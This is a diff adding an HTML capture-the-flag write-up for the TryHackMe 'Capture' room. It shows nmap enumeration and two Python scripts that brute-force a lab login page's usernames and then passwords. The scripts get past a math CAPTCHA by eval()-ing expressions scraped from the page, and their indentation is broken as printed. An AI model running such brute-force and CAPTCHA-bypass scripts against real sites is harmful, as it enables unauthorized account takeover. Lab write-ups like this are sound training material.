@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Capture Writeup | TryHackMe </title>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+</head>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Anonymous+Pro:wght@700&display=swap');
+
+.brandlogo{
+	font-family: 'Anonymous Pro',monospace; 
+	font-size: 35px;"
+}
+.brandlogo:hover{
+	color: red;
+	font-size: 36px;
+	transition: 1s;
+}
+
+#burger span{
+	background-color: white;
+}
+.para{
+	padding: 20px;
+	margin: 10px;
+}
+
+pre {
+	border: 1px solid black;
+	border-radius: 10px;
+	margin: 10px;
+}
+
+img{
+	margin: 10px;
+	padding: 10px;
+
+}
+
+p{
+	color: black;
+}
+.notification{
+	border: 0.5px solid lightgray;
+	border-radius: 15px;
+}
+
+/*Scrollbar styling*/
+
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+}
+
+/* Track */
+::-webkit-scrollbar-track {
+  box-shadow: inset 0 0 5px grey;
+  border-radius: 10px;
+}
+
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: darkslategray;	
+  border-radius: 10px;
+}
+
+code{
+	color: green;
+}
+</style>
+
+<body>
+
+<!-- Navigation Bar -->
+<nav class="navbar is-dark has-shadow" role="navigation" aria-label="main navigation">
+	
+	<div class="navbar-brand">
+		<a class="navbar-item brandlogo" style="cursor: text;">RedTrib3</a>
+	</div>
+
+	<a class="navbar-burger" id="burger">
+	  <span ></span>
+      <span ></span>
+      <span ></span>
+	</a>
+
+	<div id="links_Nav" class="navbar-menu" >
+		<div class="navbar-start">
+			<a href="/index.html" class="navbar-item"> Home </a>
+			<a href="/static/overview.html" class="navbar-item"> Writeups </a>
+			<a href="/static/socials.html" class="navbar-item"> Socials </a>
+		</div>
+
+	</div>	
+</nav>
+
+
+
+<!-- Hero card/Title holder -->
+
+<section class="hero is-link">
+	<div style="margin: 10px;padding: 20px;"  class="container">
+
+		<h1 class="title" style="font-family:monospace">
+			<!--is-success = easy, is-warning=medium, is-danger=hard --->
+			<span class="tag is-success is-small ">Difficulty: Easy</span><br>
+			Capture
+		</h1>
+		<h2 class="subtitle is-italic is-size-6">@redtrib3 | 1 min read</h2>
+
+	</div>
+</section>
+
+<!---BreadCrumbs-->
+<nav class="breadcrumb is-centered " style="padding-left:15px;"  >
+  <ul>
+    <li><a href="/portfolio/index.html">Home</a></li>
+    <li><a href="/portfolio/static/overview.html">Writeups</a></li>
+    <li class="is-active"><a href="#" aria-current="page">Capture!</a></li>
+  </ul>
+</nav>	
+
+
+
+<!--Start of Containers--->
+
+	<div class="container para">
+		<div class="notification">
+		<h1 class="title is-size-3 has-text-dark ">👋 Introduction</h1><br>	
+	Hi there!, 
+	Capture is a room created by <a href="https://tryhackme.com/p/toxicat0r">Toxicat0r</a> in <a href="https://tryhackme.com/room/capture">TryHackme</a> Rated as Easy . Its actually quite simple
+	if you know scripting. Without Further Ado lets Start! <br><br>
+	
+	<img src="/portfolio/images/capture/capture.png"><br><br>
+	</div>
+		
+	</div>
+	
+	<div class="container para" id="more">
+		<div class="notification">
+			<h2 class="title">🔍 Enumeration </h2><br>
+			
+			As always we do, let's use nmap to find the open ports<br>
+			<code>nmap 10.10.221.12 -vv</code>.<br><br>
+			The results show just one open port - 80<br>Download the taskfiles, and we see two files usernames.txt and passwords.txt
+			<br>indicating brute-force attack.
+
+		</div>
+	</div>	
+
+	<div class="container para" id="more">
+		<div class="notification">
+			
+			The exploitation is fairly easy and involves creating a script to bruteforce the login page But the page has rate
+			limiting in place and requires us to solve CAPTCHA.
+			<br><br>
+			My solution to username Enumeration in python ( using Regex )
+			
+			<pre>
+			
+            #!/usr/bin/env python3
+
+            import requests
+            import re
+
+
+            url = "http://10.10.88.108/login"
+    
+            with open("usernames.txt","r") as f:
+            usernames = [i.strip() for i in f.readlines()]
+
+            print("[+] Usernames extracted !")
+
+            for username in usernames:
+                data  = {"username":username,"password":"asdasd"}
+                r = requests.post(url, data=data)
+
+            if "Captcha enabled" in r.text:
+
+                exp = re.search(r'([0-9]+)\s*([+\-*/])\s*([0-9]+)', r.text).group(0)
+                result= eval(exp)
+                data2 = {"username":username,"password":"asdasd","captcha":result}
+                r2 = requests.post(url, data=data2)
+        
+                if "does not exist" in r2.text:
+                    print("[!] Invalid: "+username)
+        
+                elif "Invalid captcha" in r2.text:
+                    print("[!] Captch failed")
+        
+                else:
+                    print("Username found : ",username)
+                    break
+
+
+			</pre> 
+
+            <br>After some minutes of patience, found the username. 
+            
+            
+            Password enumeration:
+            
+            <pre>
+            #!/usr/bin/env python3
+
+            import requests
+            import re
+
+
+            url = "http://10.10.88.108/login"
+    
+            with open("passwords.txt","r") as f:
+                passwords = [i.strip() for i in f.readlines()]
+
+            print("[+] Passwords extracted !\n")
+
+            for password in passwords:
+
+                data  = {"username":"natalie","password":password}
+                r = requests.post(url, data=data)
+
+            if "Captcha enabled" in r.text:
+
+                exp = re.search(r'([0-9]+)\s*([+\-*/])\s*([0-9]+)', r.text).group(0)
+                result= eval(exp)
+                data2 = {"username":"natalie","password":password,"captcha":result}
+                r2 = requests.post(url, data=data2)
+
+                if "Invalid password" in r2.text:
+                    print("[!] Invalid natalie : "+password)
+    
+                elif "Invalid captcha" in r2.text:
+                    print("[!] Captcha failed")
+
+                else:
+                    print("password Found : ",password)
+                    break
+                    
+            </pre>
+            
+            <br>After running both one after another, we get both username and password!, login to get the flag!<br>
+		</div>
+	</div>	
+        
+
+<!-- footer section -->
+<footer class="footer">
+	<div class="content has-text-centered">
+		
+		<p class="brandlogo" style="font-size: 20px;color: gray;">RedTribe</p>
+              <img src="https://hits.sh/redtribe.github.io/portfolio/static/writeups/capture.html.svg?style=for-the-badge&label=Views&color=007ec6&labelColor=000000&logo=Tryhackme">
+		<div class="footer-links ">
+			<a class="button is-text"> MIT License </a>
+			<a class="button is-text"> Support</a>	
+		</div><br>
+		
+		<div>
+			<p class="has-text-grey">&copy; 2021  | All rights reserved</p>
+		</div>
+	</div>
+</footer>
+
+
+<!--BurgerScript-->
+<script src="/portfolio/static/js/burgerToggle.js"></script>
+
+</body>
+</html>
